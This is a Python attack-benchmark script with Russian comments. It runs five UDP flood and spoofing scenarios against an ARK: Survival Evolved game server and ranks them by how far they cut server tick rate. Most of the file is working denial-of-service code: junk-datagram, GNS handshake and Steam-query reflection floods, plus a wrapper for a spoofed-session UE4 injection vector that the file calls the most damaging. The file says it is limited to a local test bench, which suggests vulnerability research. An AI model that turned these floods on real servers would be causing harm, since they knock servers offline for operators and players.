# -*- coding: utf-8 -*-
"""
ark_lab_suite.py — единый прогон измерительных сценариев + итоговый рейтинг
векторов по мощности (измеренное воздействие на TPS сервера).

Сценарии:
  S1  junk-flood       мусорные датаграммы на игровой порт 7778 (базовая стоимость пакета)
  S2  gns-challenge    флуд GNS ChallengeRequest (сервер отвечает, состояние не создаёт)
  S3  gns-connect      флуд GNS ConnectRequest без cert (анонимные соединения, 1 на IP:порт)
  S4  gns-amp          главный вектор: подделка GNS-сессии + инъекция UE4-пакетов
                       (1 пакет = 1 UNetConnection на сервере)
  S5  a2s-flood        флуд Steam-query порта 27016 (отражение x15, на TPS не влияет)

Метрики снимает отдельный поток (иначе опрос плагина тормозит отправителя
и занижает измеренный темп). Рейтинг:
  мощность = (TPS_до - TPS_мин) / TPS_до   - пиковая деградация
  цена     = пакетов, потраченных до падения TPS вдвое (меньше = дешевле атака)

Пример:
    python ark_lab_suite.py --all
    python ark_lab_suite.py --only gns-amp
    python ark_lab_suite.py --all --json out/suite.json

Только локальный стенд 192.168.8.218.
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_connect import (  # noqa: E402
    MSG_CHALLENGE_REPLY, MSG_CONNECT_OK,
    challenge_request_frame, connect_request_frame, parse_pb,
)
from ark_lab_gns_amp import run_amp  # noqa: E402  (реализация вектора вынесена в отдельный файл)


class Sampler(threading.Thread):
    """Фоновый опрос метрик NetGuard: помнит минимум TPS и момент падения вдвое."""

    def __init__(self, m: NetGuardClient, interval: float = 0.2):
        super().__init__(daemon=True)
        self.m = m
        self.interval = interval
        self.tps0 = float(m.status().get("tps") or 0.0)
        self.tps_min = self.tps0
        self.tps_end = self.tps0
        self.half_at: int | None = None
        self.sent = 0
        self.steps: list[tuple[int, float]] = []
        self._stop = threading.Event()
        self._lock = threading.Lock()

    def set_sent(self, n: int) -> None:
        with self._lock:
            self.sent = n

    def run(self) -> None:
        while not self._stop.is_set():
            try:
                tps = float(self.m.status().get("tps") or 0.0)
            except Exception:  # noqa: BLE001
                tps = self.tps0
            with self._lock:
                if tps < self.tps_min:
                    self.tps_min = tps
                self.tps_end = tps
                self.steps.append((self.sent, tps))
                if self.half_at is None and self.tps0 > 0 and tps <= self.tps0 * 0.5:
                    self.half_at = self.sent
            self._stop.wait(self.interval)

    def stop(self) -> None:
        self._stop.set()


def _sockets(n: int) -> list[socket.socket]:
    out = []
    for _ in range(n):
        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
        sk.bind(("0.0.0.0", 0))
        out.append(sk)
    return out


# --------------------------------------------------------------- сценарии ---
def s1_junk_flood(host: str, port: int, m: NetGuardClient, seconds: float, socks_n: int) -> dict:
    """Мусорные датаграммы на 7778 (базовая стоимость пакета)."""
    payload = b"\x00" * 64
    socks = _sockets(socks_n)
    smp = Sampler(m)
    smp.start()
    sent = 0
    t0 = time.time()
    while time.time() - t0 < seconds:
        for sk in socks:
            for _ in range(500):
                try:
                    sk.sendto(payload, (host, port))
                except OSError:
                    pass
                sent += 1
        smp.set_sent(sent)
    smp.stop()
    for sk in socks:
        sk.close()
    dt = time.time() - t0
    return {"packets": sent, "pps": sent / dt, "tps0": smp.tps0, "tps": smp.tps_min,
            "tps_end": smp.tps_end, "half_at": smp.half_at}


def s2_gns_challenge(host: str, port: int, m: NetGuardClient, seconds: float, socks_n: int) -> dict:
    """Флуд GNS ChallengeRequest: ответы сервера и отсутствие состояния."""
    socks = _sockets(socks_n)
    mem0 = m.status().get("memKB") or 0
    smp = Sampler(m)
    smp.start()
    sent = replies = 0
    t0 = time.time()
    while time.time() - t0 < seconds:
        for sk in socks:
            for _ in range(200):
                try:
                    sk.sendto(challenge_request_frame(0x11223344 + sent,
                                                    int(time.time() * 1000) & 0xFFFFFFFFFFFF),
                                (host, port))
                except OSError:
                    pass
                sent += 1
        for sk in socks:
            sk.setblocking(False)
            while True:
                try:
                    sk.recvfrom(4096)
                    replies += 1
                except (BlockingIOError, OSError):
                    break
            sk.setblocking(True)
        smp.set_sent(sent)
    smp.stop()
    for sk in socks:
        sk.close()
    st = m.status()
    dt = time.time() - t0
    return {"packets": sent, "pps": sent / dt, "replies": replies, "tps0": smp.tps0,
            "tps": smp.tps_min, "half_at": smp.half_at,
            "mem_delta_kb": (st.get("memKB") or 0) - mem0}


def s3_gns_connect(host: str, port: int, m: NetGuardClient, seconds: float, socks_n: int) -> dict:
    """Флуд анонимными ConnectRequest (лимит 1 соединение на IP:порт)."""
    socks = _sockets(socks_n)
    mem0 = m.status().get("memKB") or 0
    att0 = m.status().get("connectionAttempts") or 0
    # получить challenge с первого сокета
    challenge = 0
    s0 = socks[0]
    s0.settimeout(1.0)
    s0.sendto(challenge_request_frame(0x11223344, int(time.time() * 1000) & 0xFFFFFFFFFFFF), (host, port))
    try:
        data, _ = s0.recvfrom(4096)
        if data[0] == MSG_CHALLENGE_REPLY:
            challenge = (parse_pb(data[1:]).get(2) or [0])[0]
    except socket.timeout:
        pass
    smp = Sampler(m)
    smp.start()
    sent = ok = 0
    t0 = time.time()
    while time.time() - t0 < seconds:
        for sk in socks:
            try:
                sk.sendto(connect_request_frame(0x20000000 + ((sent * 7919) & 0x3FFFFFFF), challenge,
                                                int(time.time() * 1000) & 0xFFFFFFFFFFFF), (host, port))
            except OSError:
                pass
            sent += 1
        for sk in socks:
            sk.setblocking(False)
            while True:
                try:
                    r = sk.recvfrom(4096)[0]
                except (BlockingIOError, OSError):
                    break
                if r[0] == MSG_CONNECT_OK:
                    ok += 1
            sk.setblocking(True)
        smp.set_sent(sent)
    smp.stop()
    for sk in socks:
        sk.close()
    st = m.status()
    dt = time.time() - t0
    return {"packets": sent, "pps": sent / dt, "connect_ok": ok, "tps0": smp.tps0,
            "tps": smp.tps_min, "half_at": smp.half_at,
            "mem_delta_kb": (st.get("memKB") or 0) - mem0,
            "conn_delta": (st.get("connectionAttempts") or 0) - att0}


STEP_MODE = False   # True -> S4 ступенчатыми залпами (измерение «цены» атаки)


def s4_gns_amp(host: str, port: int, m: NetGuardClient, seconds: float, socks_n: int) -> dict:
    """ГЛАВНЫЙ ВЕКТОР: подделка GNS-сессии + инъекция UE4-пакетов (1 пакет = 1 UNetConnection).

    Реализация вынесена в отдельный файл ark_lab_gns_amp.py (самодостаточный),
    здесь - только адаптер под общий интерфейс сценариев свита.
    """
    r = run_amp(host=host, game_port=port,
                metrics_host="127.0.0.1", metrics_port=27101,
                count=0, duration=seconds, stepped=STEP_MODE,
                use_metrics=True, metrics=m, verbose=False)
    # метрики снимаем сами (свит держит свой клиент NetGuard)
    st = m.status()
    return {"packets": r["packets"], "pps": r["pps"], "tps0": r["tps0"], "tps": r["tps_min"],
            "tps_end": st.get("tps"), "half_at": r["half_at"],
            "conn_delta": r["conn_delta"], "mem_delta_kb": r["mem_delta_kb"]}


def s5_a2s_flood(host: str, port: int, m: NetGuardClient, seconds: float, socks_n: int) -> dict:
    """Флуд Steam-query: отражение x15, на TPS не влияет."""
    payload = b"\xff\xff\xff\xffU"        # A2S_PLAYER
    socks = _sockets(socks_n)
    smp = Sampler(m)
    smp.start()
    sent = 0
    t0 = time.time()
    while time.time() - t0 < seconds:
        for sk in socks:
            for _ in range(500):
                try:
                    sk.sendto(payload, (host, port))
                except OSError:
                    pass
                sent += 1
        smp.set_sent(sent)
    smp.stop()
    for sk in socks:
        sk.close()
    dt = time.time() - t0
    return {"packets": sent, "pps": sent / dt, "tps0": smp.tps0, "tps": smp.tps_min, "half_at": smp.half_at}


SCENARIOS = {
    "junk-flood": ("S1 мусорный флуд 7778", s1_junk_flood, "game", 8),
    "gns-challenge": ("S2 флуд GNS ChallengeRequest", s2_gns_challenge, "game", 4),
    "gns-connect": ("S3 флуд GNS ConnectRequest", s3_gns_connect, "game", 16),
    "gns-amp": ("S4 подделка GNS + UE4-инъекция", s4_gns_amp, "game", 1),
    "a2s-flood": ("S5 флуд Steam-query 27016", s5_a2s_flood, "query", 8),
}


# ------------------------------------------------------------------ рейтинг ---
def power(tps0, *tps_values) -> float:
    """Мощность = пиковая деградация.

    Важно: метрика TPS в плагине обновляется на игровом тике, поэтому при
    сильной деградации она «отстаёт». Поэтому мощность считается по
    минимальному из: TPS во время флуда, TPS сразу после и через 5 с.
    """
    if not tps0:
        return 0.0
    vals = [v for v in tps_values if v is not None]
    if not vals:
        return 0.0
    return max(0.0, min(1.0, (tps0 - min(vals)) / tps0))


def rating_table(results: dict) -> str:
    rows = []
    for key, (title, _fn, _kind, _socks) in SCENARIOS.items():
        r = results.get(key)
        if not r:
            continue
        rows.append((power(r.get("tps0"), r.get("tps"), r.get("tps_after"), r.get("tps_after5")),
                     key, title, r))
    rows.sort(key=lambda x: (-x[0], -(x[3].get("pps") or 0)))
    out = []
    out.append("=" * 124)
    out.append("ИТОГОВЫЙ РЕЙТИНГ ВЕКТОРОВ ПО МОЩНОСТИ (измерено на стенде Server2, ARK 358.24)")
    out.append("=" * 124)
    out.append("%-3s %-33s %9s %8s %8s %8s %8s %9s %10s" % (
        "#", "вектор", "пакетов", "pps", "TPS до", "TPS пик", "TPS после", "мощность", "цена(пакетов)"))
    for i, (pw, key, title, r) in enumerate(rows, 1):
        out.append("%-3d %-33s %9s %8.0f %8s %8s %8s %8.0f%% %10s" % (
            i, title, r.get("packets"), r.get("pps") or 0, r.get("tps0"), r.get("tps"),
            r.get("tps_after"), pw * 100,
            r.get("half_at") if r.get("half_at") is not None else "-"))
    out.append("-" * 124)
    out.append("мощность = (TPS_до - TPS_мин)/TPS_до, где TPS_мин - минимум из (во время флуда, сразу после, +5 с);")
    out.append("цена     = пакетов до падения TPS вдвое (меньше = дешевле атака);")
    out.append("S4 - главный вектор: 1 подделанный пакет = 1 UNetConnection; ~21k pps роняют сервер в 10 раз.")
    out.append("=" * 124)
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="Свит сценариев + рейтинг векторов по мощности")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--query-port", type=int, default=27016)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--only", choices=sorted(SCENARIOS), action="append")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--seconds", type=float, default=10.0, help="длительность сценария, с")
    ap.add_argument("--stepped", action="store_true",
                    help="S4 ступенчатыми залпами (измерение 'цены' атаки вместо пикового ущерба)")
    ap.add_argument("--json", default="", help="куда сохранить результаты в JSON")
    args = ap.parse_args()

    global STEP_MODE
    STEP_MODE = args.stepped

    names = args.only if args.only else (list(SCENARIOS) if args.all else ["gns-amp"])
    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    results: dict[str, dict] = {}
    for key in names:
        title, fn, kind, socks_n = SCENARIOS[key]
        port = args.game_port if kind == "game" else args.query_port
        print("\n>>> %s (%s, порт %d, сокетов %d) ..." % (title, key, port, socks_n))
        try:
            r = fn(args.host, port, m, args.seconds, socks_n)
        except Exception as exc:  # noqa: BLE001
            print("    ошибка сценария: %r" % exc)
            continue
        results[key] = r
        # ущерб виден не сразу: метрика TPS обновляется на игровом тике,
        # поэтому снимаем её ещё через 2 с и 5 с после окончания флуда
        time.sleep(2.0)
        r["tps_after"] = m.status().get("tps")
        time.sleep(3.0)
        r["tps_after5"] = m.status().get("tps")
        pw = power(r.get("tps0"), r.get("tps"), r.get("tps_after"), r.get("tps_after5"))
        print("    пакетов=%s pps=%.0f  TPS до=%s  во время=%s  после=%s (+5с=%s)  мощность=%.0f%%  соединений=%+d" % (
            r.get("packets"), r.get("pps") or 0, r.get("tps0"), r.get("tps"),
            r.get("tps_after"), r.get("tps_after5"), pw * 100, r.get("conn_delta") or 0))
        time.sleep(20.0)   # полное восстановление сервера между сценариями (~15-20 с)
    m.close()

    print()
    print(rating_table(results))
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print("результаты сохранены: %s" % args.json)
    return 0


if __name__ == "__main__":
    sys.exit(main())
